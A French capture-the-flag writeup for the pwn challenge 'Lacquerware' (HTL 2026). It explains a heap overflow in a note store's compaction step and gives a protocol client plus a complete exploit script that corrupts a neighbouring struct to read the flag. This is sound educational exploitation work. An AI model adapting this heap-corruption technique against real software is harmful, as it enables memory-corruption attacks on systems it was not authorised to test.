# Lacquerware — writeup

- **CTF** : Hack Ton Lycée (HTL) 2026
- **Catégorie** : pwn — **834 pts** (44 solves)
- **Remote** : `nc pwn.ctf.yogosha.com 30004`
- **Binaire** : PIE, Full RELRO, canary, glibc 2.39 / Ubuntu 24.04. On démarre **sans leak**.

## Énoncé

`lacquerware` est un store de notes journalisé parlant le protocole binaire
`LqW1` (voir `PROTOCOL.md`) : `CREATE` / `UPDATE` / `COMPACT` / `READ` /
`DELETE`. La compaction est le point intéressant : un `UPDATE` plus grand que la
capacité est *stagé* et marqué, et la prochaine compaction le migre et adopte la
nouvelle capacité. Il faut trouver l'ordonnancement qui transforme cette passe
en primitive de corruption mémoire et lire `/srv/flag.txt`.

## La vulnérabilité

Un `UPDATE` surdimensionné stocke les données dans `n->pending`, met `n->len =
dlen` et `n->grew = 1` **sans réallouer `n->buf`**. Puis `op_compact` (store.c) :

```c
size_t *stitch = (size_t *)(n->buf + n->cap);
*stitch = n->len;              // (1) write 8 octets juste APRÈS buf
n->cap = n->len;               // adopte la nouvelle capacité...
memcpy(n->buf, n->pending, n->plen);   // (2) ...mais buf n'est PAS réalloué !
```

`buf` a été alloué à l'**ancienne** `cap` (petite), mais `memcpy` recopie `plen`
(jusqu'à `0x2000`) dedans → **heap overflow linéaire totalement contrôlé** dans
le chunk voisin. (1) donne en prime une écriture de 8 octets contrôlés à
`buf+cap`.

La `struct note` du voisin est écrasable : `gen`, `live`, `len`, `cap`, et
surtout le pointeur **`buf`** → lecture/écriture arbitraire via `READ`/`UPDATE`.

## Exploitation pas à pas (sans leak préalable)

Petit client pour le protocole `LqW1` (big-endian, longueurs explicites) :

```python
import socket, struct
MAGIC=b"LqW1"; be32=lambda v:struct.pack(">I",v); be64=lambda v:struct.pack(">Q",v)
class Lq:
    def __init__(s,io): s.io=io
    def _rn(s,n):
        d=b""
        while len(d)<n: d+=s.io.recv(n-len(d))
        return d
    def _f(s,op,b=b""): s.io.sendall(MAGIC+bytes([op])+b)
    def create(s,cap,data=b"",label=b""):
        s._f(1, be32(cap)+bytes([len(label)])+label+be32(len(data))+data)
        return struct.unpack(">Q",s._rn(9)[1:])[0]      # status + handle
    def update(s,h,d): s._f(2, be64(h)+be32(len(d))+d); return s._rn(1)
    def compact(s): s._f(3); return s._rn(1)
    def read(s,h):
        s._f(4, be64(h)); st=s._rn(1); n=struct.unpack(">I",s._rn(4))[0]
        return s._rn(n) if n else b""
```

**Étape 1 — quatre notes adjacentes.** Chaque `note` (struct `0x60`) est suivie
de son `buf` (`0x50`). On en crée 4 pour avoir des voisins à écraser.

```python
io = socket.create_connection(("pwn.ctf.yogosha.com", 30004)); c = Lq(io)
h = [c.create(0x40, b"init%d"%k, label=b"n%d"%k) for k in range(4)]
```

**Étape 2 — la primitive d'overflow.** Un `UPDATE` surdimensionné (> cap) stage
les données ; le `COMPACT` suivant les `memcpy` dans un `buf` **non réalloué** →
on écrase la struct `note` voisine. Le payload reconstruit ses champs : `0x48`
= taille de chunk, `0x50` = `gen|live` (handle maintenu valide), puis un
`trailer` qui écrase `len`/`cap`/`buf`.

```python
GEN_LIVE   = struct.pack("<Q", 0x0000000100000001)   # gen=1, live=1
NOTE_CHUNK = struct.pack("<Q", 0x61)
def overflow(trailer):
    return b"\x90"*0x48 + NOTE_CHUNK + GEN_LIVE + trailer   # 0x58 = len,cap,[buf]
def do(src_handle, trailer):
    c.update(src_handle, overflow(trailer)); c.compact()
```

**Étape 3 — Phase A : fuite d'un pointeur de tas.** On agrandit seulement
`len`/`cap` de `slot1` (sans toucher `slot1.buf`, à l'offset `0x68`). Un
`READ(slot1)` relit alors bien au-delà de son buffer et expose le pointeur
`buf` de `slot2` → base du tas.

```python
do(h[0], struct.pack("<Q", 0x500) + struct.pack("<Q", 0x500))   # len, cap énormes
dump = c.read(h[1])
slot2_buf = struct.unpack("<Q", dump[0x68:0x70])[0]
g_flag = slot2_buf - 0x2d0        # g_flag = malloc(0x100) au démarrage (load_flag)
print(hex(slot2_buf), "-> g_flag", hex(g_flag))
```

**Étape 4 — Phase B : rediriger un `buf` vers `g_flag`.** Le flag est chargé au
démarrage dans `g_flag` (dans le tas), donc **pas besoin de leak libc**. On
déborde `slot2` → `slot3` et on réécrit `slot3.buf = g_flag` ; `READ(slot3)`
recrache le flag.

```python
do(h[2], struct.pack("<Q",0x100) + struct.pack("<Q",0x100) + struct.pack("<Q",g_flag))
print(c.read(h[3]).split(b"\x00")[0])      # HTL{...}
```

## Exploit complet

Sockets, sans dépendance — testé en local contre le binaire fourni. Lancement :

```
python3 exploit.py pwn.ctf.yogosha.com 30004
```

Script intégral :

```python
#!/usr/bin/env python3
# Lacquerware (HTL 2026) — exploit autonome (sockets, sans dépendance).
import socket, struct, sys

MAGIC = b"LqW1"
be32 = lambda v: struct.pack(">I", v)
be64 = lambda v: struct.pack(">Q", v)

class Lq:
    def __init__(self, io): self.io = io
    def _rn(self, n):
        d = b""
        while len(d) < n:
            c = self.io.recv(n - len(d))
            if not c: raise EOFError
            d += c
        return d
    def _f(self, op, body=b""): self.io.sendall(MAGIC + bytes([op]) + body)
    def create(self, cap, data=b"", label=b""):
        self._f(1, be32(cap) + bytes([len(label)]) + label + be32(len(data)) + data)
        if self._rn(1) != b"\x00": return None
        return struct.unpack(">Q", self._rn(8))[0]
    def update(self, h, data): self._f(2, be64(h) + be32(len(data)) + data); return self._rn(1)
    def compact(self): self._f(3); return self._rn(1)
    def read(self, h):
        self._f(4, be64(h))
        if self._rn(1) != b"\x00": return None
        n = struct.unpack(">I", self._rn(4))[0]
        return self._rn(n) if n else b""
    def delete(self, h): self._f(5, be64(h)); return self._rn(1)

# layout mesuré sous glibc 2.39 (Ubuntu 24.04)
GEN_LIVE   = struct.pack("<Q", 0x0000000100000001)   # gen=1, live=1
NOTE_CHUNK = struct.pack("<Q", 0x61)                 # taille de chunk de la note voisine
OFF_SLOT2_FROM_GFLAG = 0x2d0                          # slot2.buf - g_flag

def overflow(trailer):
    # 0x00..0x48 remplissage, 0x48 taille de chunk, 0x50 gen|live, 0x58 trailer
    return b"\x90" * 0x48 + NOTE_CHUNK + GEN_LIVE + trailer

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30004
    io = socket.create_connection((host, port), timeout=6); io.settimeout(3)
    c = Lq(io)

    h = [c.create(0x40, b"init%d" % k, label=b"n%d" % k) for k in range(4)]

    # --- Phase A : agrandir slot1 (len,cap) sans toucher slot1.buf ---
    c.update(h[0], overflow(struct.pack("<Q", 0x500) + struct.pack("<Q", 0x500)))
    c.compact()
    dump = c.read(h[1])
    slot2_buf = struct.unpack("<Q", dump[0x68:0x70])[0]
    g_flag = slot2_buf - OFF_SLOT2_FROM_GFLAG
    print("[*] slot2.buf = %#x  ->  g_flag = %#x" % (slot2_buf, g_flag))

    # --- Phase B : rediriger slot3.buf -> g_flag ---
    c.update(h[2], overflow(struct.pack("<Q", 0x100) + struct.pack("<Q", 0x100) + struct.pack("<Q", g_flag)))
    c.compact()
    flag = c.read(h[3]).split(b"\x00")[0]
    print("[+] FLAG:", flag.decode(errors="replace"))

if __name__ == "__main__":
    main()
```

> Une version pwntools équivalente reste disponible dans `work/exploit.py`.

Constantes (glibc 2.39, à re-mesurer si l'environnement change) :

| nom                     | valeur  | sens                              |
|-------------------------|---------|-----------------------------------|
| offset `slot1.buf` dans le dump | `0x68` | où lire le pointeur de `slot2` |
| `slot2.buf - g_flag`    | `0x2d0` | pour retrouver `g_flag`           |

## Flag

`HTL{leakless_tangerine_on_2_39}` (relu depuis `g_flag` dans le heap via `slot3.buf` redirigé).
